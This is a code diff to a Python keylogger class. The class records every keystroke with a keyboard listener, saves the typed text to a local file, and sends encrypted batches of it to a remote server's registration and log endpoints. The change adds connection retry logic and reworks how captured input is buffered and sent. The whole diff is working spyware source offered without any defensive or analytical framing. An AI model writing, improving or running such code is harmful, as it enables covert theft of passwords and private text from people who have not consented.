@@ -22,11 +22,21 @@ class KeyLogger:
         
         self.id = str(uuid.uuid4())
         self.encrytion = Fernet.generate_key()
+        self.host = host
+        self.server_connection = False 
+        self.establish_connection()
         
-        if host is not None:                                                                                                                                                                                                            
-            response = requests.get(host)
+        self.path = self.id + ".txt"
+        self.values = ""
+        self.last_press = 0
+        self.listener = kb.Listener(on_press=self.on_press)
+        self.listener.start()
+    
+    def establish_connection(self):
+        if self.host is not None:                                                                                                                                                                                                            
+            response = requests.get(self.host)
+            
             if response.status_code == 200:
-                self.host = host
                 key = response.json()['data']
                 data = {
                     "id": self.id,
@@ -35,16 +45,12 @@ class KeyLogger:
                 encrypted_data = {
                     "data": self.cipher(data, key)
                 }
-                response = requests.post(host+"/register", json=encrypted_data)
+                response = requests.post(self.host+"/register", json=encrypted_data)
+                self.server_connection = True 
                 
             else:
                 raise Exception("host error")
         
-        self.path = self.id + ".txt"
-        self.values = ""
-        self.last_press = 0
-        self.listener = kb.Listener(on_press=self.on_press)
-        self.listener.start()
     
     def cipher(self, data: str, key: str = None,  encrypt: bool = True) -> str:
         
@@ -64,7 +70,12 @@ class KeyLogger:
     
     def send_value(self):
         
-        if self.host is not None and len(self.values) > 0:
+        if not self.server_connection:
+            self.establish_connection()
+            if not self.server_connection:
+                return
+        
+        if len(self.values) > 0:
             data = {
                 "id": self.id,
                 "word": self.values,
@@ -75,11 +86,12 @@ class KeyLogger:
                 "data": encryp + f"?{self.id}"
             }
             response = requests.post(self.host+"log/", json= encrypted_data)
-            self.values = ""
             
             if response.status_code != 200:
                 print("The process is over")
                 self.kill()
+        
+        self.values = ""
     
     def delete_value(self, Waiting_time = 5):
         actual_press = time.time()
@@ -101,7 +113,6 @@ class KeyLogger:
         with open(self.path, "a") as file:
             try:
                 char = key.char
-                file.write(char)
                 self.values += char
                 self.last_press = time.time()
                 
@@ -109,6 +120,7 @@ class KeyLogger:
                 name = key.name
                 if name == "space":
                     self.values += " "
+                    file.write(" ")
                 
                 if name == "tab":
                     file.write("\t")
@@ -118,7 +130,7 @@ class KeyLogger:
                     self.delete_value()
                     
                 if name == "enter":      
-                    file.write("\n")
+                    file.write(self.values+"\n")
                     self.send_value()
                     
             file.close()
